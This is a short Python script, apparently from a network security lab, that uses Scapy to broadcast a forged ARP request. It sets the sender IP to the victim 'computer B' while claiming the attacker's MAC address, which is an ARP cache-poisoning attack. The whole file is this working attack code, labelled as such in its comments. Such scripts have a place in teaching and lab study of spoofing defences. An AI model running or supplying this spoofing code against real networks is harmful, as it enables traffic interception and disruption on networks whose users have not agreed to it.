#!/usr/bin/python3
from scapy.all import *

E = Ether(src='08:00:27:28:a6:34', dst='ff:ff:ff:ff:ff:ff') #src is Attack MAC address, dst is Broadcast MAC address.
A = ARP(op=1, hwdst='ff:ff:ff:ff:ff:ff', pdst='10.0.2.7', hwsrc='08:00:27:28:a6:34', psrc='10.0.2.7') #pdst and psrc is computer B IP address.
pkt = E/A
sendp(pkt)
